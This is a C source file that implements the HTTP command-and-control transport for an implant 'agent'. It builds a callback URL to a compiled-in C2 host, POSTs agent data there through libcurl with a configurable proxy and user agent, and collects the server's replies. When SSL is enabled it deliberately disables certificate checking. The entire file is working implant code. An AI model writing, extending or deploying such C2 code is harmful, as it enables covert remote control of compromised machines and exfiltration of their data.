#include "agent.h"
#include "c2.h"
#include "config.h"
#include "utils.h"
#include <curl/curl.h>
#include <curl/easy.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

// HTTP-specific C2 configuration. Opaque to everything outside this file.
struct C2Config {
    char hostname[256];
    char endpoint[256];
    char proxyurl[256];
    char useragent[BUFSIZE];
    char httpmethod[32];
    char cb_url[BUFSIZE];
    short port;
    bool ssl;
    bool proxyenabled;
};

int sendPost(Agent *agent, char *data, int len, MsgResp *resp);
size_t postCallback(char *ptr, size_t size, size_t nmemb, void *userdata);

size_t postCallback(char *data, size_t size, size_t nmemb, void *server_response) {
    size_t realsize = size * nmemb;
    MsgResp *resp = (MsgResp *)server_response;

    char *ptr = realloc(resp->response, resp->size + realsize + 1);
    if (!ptr)
        return 0; /* out of memory */

    resp->response = ptr;
    memcpy(&(resp->response[resp->size]), data, realsize);
    resp->size += realsize;
    resp->response[resp->size] = 0;

    return realsize;
}

void c2Setup(void) { curl_global_init(CURL_GLOBAL_ALL); }

void c2Teardown(void) { curl_global_cleanup(); }

C2Config *createC2Config(void) {
    C2Config *config = calloc(1, sizeof(C2Config));
    if (!config)
        return NULL;

    strncpy(config->hostname, HOST_NAME, sizeof(config->hostname) - 1);
    strncpy(config->endpoint, END_POINT, sizeof(config->endpoint) - 1);
    strncpy(config->proxyurl, PROXY_URL, sizeof(config->proxyurl) - 1);
    strncpy(config->useragent, USER_AGENT, sizeof(config->useragent) - 1);
    strncpy(config->httpmethod, HTTPMETHOD, sizeof(config->httpmethod) - 1);
    config->ssl = SSL_ENABLED;
    config->proxyenabled = PROXY_ENABLED;
    config->port = PORT;

    // build callback URL
    size_t url_len = 0;
    const char *scheme = config->ssl ? "https://" : "http://";
    size_t scheme_len = config->ssl ? (sizeof("https://") - 1) : (sizeof("http://") - 1);
    memcpy(config->cb_url, scheme, scheme_len);
    url_len += scheme_len;
    memcpy(config->cb_url + url_len, config->hostname, sizeof(HOST_NAME) - 1);
    url_len += sizeof(HOST_NAME) - 1;
    config->cb_url[url_len++] = '/';
    memcpy(config->cb_url + url_len, config->endpoint, sizeof(END_POINT) - 1);
    url_len += sizeof(END_POINT) - 1;
    config->cb_url[url_len] = '\0';

    return config;
}

void destroyC2Config(C2Config *config) { free(config); }

#ifdef DEBUG
void printC2Config(C2Config *config) {
    DBGPRINT("{\nHOSTNAME: %s\nENDPOINT: %s\nSSL: %d\nPROXY: %d\nPROXYURL: %s\nUA: %s\nHTTPMETHOD: %s\nPORT: "
             "%d\nCBURL: %s\n}\n",
             config->hostname, config->endpoint, config->ssl, config->proxyenabled, config->proxyurl,
             config->useragent, config->httpmethod, config->port, config->cb_url);
}
#endif

int sendPost(Agent *agent, char *data, int len, MsgResp *resp) {
    C2Config *config = agent->c2config;
    CURL *curl;
    CURLcode res = CURLE_OK;

    curl = curl_easy_init();
    if (curl) {
        int ret;
        if ((ret = curl_easy_setopt(curl, CURLOPT_URL, config->cb_url)) == CURLE_OK &&
            (ret = curl_easy_setopt(curl, CURLOPT_PORT, config->port)) == CURLE_OK &&
            (ret = curl_easy_setopt(curl, CURLOPT_USERAGENT, config->useragent)) == CURLE_OK &&
            (ret = curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, len)) == CURLE_OK &&
            (ret = curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data)) == CURLE_OK &&
            (ret = curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)resp)) == CURLE_OK &&
            (ret = curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, postCallback)) == CURLE_OK) {

            // If using SSL don't verify the cert info
            if (config->ssl) {
                if ((ret = curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L)) == CURLE_OK &&
                    (ret = curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L)) == CURLE_OK) {
                    res = curl_easy_perform(curl);
                }
            } else {
                res = curl_easy_perform(curl);
            }
            if (res != CURLE_OK) {
                DBGPRINT("curl_easy_perform failed: %s", curl_easy_strerror(res));
            } else {
                long http_code = 0;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
                DBGPRINT("HTTP %ld from %s (response_len=%zu)",
                         http_code, config->cb_url, resp->size);
            }
        }
        curl_easy_cleanup(curl);
    } else {
        res = CURLE_FAILED_INIT;
    }
    return res;
}

int c2Send(Agent *agent, char *data, int len, MsgResp *resp) { return sendPost(agent, data, len, resp); }
